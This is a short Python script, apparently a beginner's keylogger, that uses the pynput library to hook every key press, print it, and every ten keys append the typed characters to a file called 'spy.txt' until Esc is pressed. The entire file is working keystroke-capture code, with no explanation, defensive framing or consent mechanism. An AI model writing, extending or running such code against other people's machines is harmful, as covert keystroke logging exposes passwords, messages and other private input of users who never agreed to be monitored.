import pynput

from pynput.keyboard import  Key, Listener


count=0
keys=[]
def pressed(key):
    global keys,count
    print(f"{key} is pressed")
    keys.append(key)
    count +=1

    if count >=10:
        count=0
        key_write(keys)
        keys=[]


def key_write(writable):
    with open("spy.txt","a") as file:
        for ky in writable:
            k=str(ky).replace("'","")
            if k.find("space")>0:
                file.write("\n")
            elif k.find("Key") ==-1:
                file.write(k)

def eject(key):
    if key==Key.esc:
        return False



with Listener(on_press=pressed, on_release=eject) as listener:
    listener.join()